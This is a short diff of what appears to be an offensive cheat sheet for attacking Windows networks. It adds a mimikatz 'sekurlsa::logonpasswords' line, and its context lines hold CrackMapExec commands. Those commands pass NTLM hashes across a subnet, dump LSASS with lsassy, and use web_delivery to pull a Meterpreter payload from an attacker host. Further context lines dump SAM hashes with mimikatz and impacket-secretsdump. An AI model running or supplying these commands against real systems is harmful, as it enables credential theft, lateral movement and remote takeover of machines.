@@ -140,6 +140,7 @@ cme smb -M slinky --options
 
 #using the modules
 crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth -M lsassy
+sekurlsa::logonpasswords
 
 #use web delivery module for meterpreter access.
 crackmapexec smb 192.168.154.134 -u 'Administrator' -p 'P@$$w0rd' -d MARVEL.local -M web_delivery -o URL=http://192.168.154.138:8080/prrpWvUt
@@ -211,6 +212,8 @@ lsadump::sam C:\SAM C:\SYSTEM
 #or transfer SAM and SYSTEM to attacker machine 
 
 impacket-secretsdump -sam SAM -system SYSTEM local 
+
+
 ```
 
 
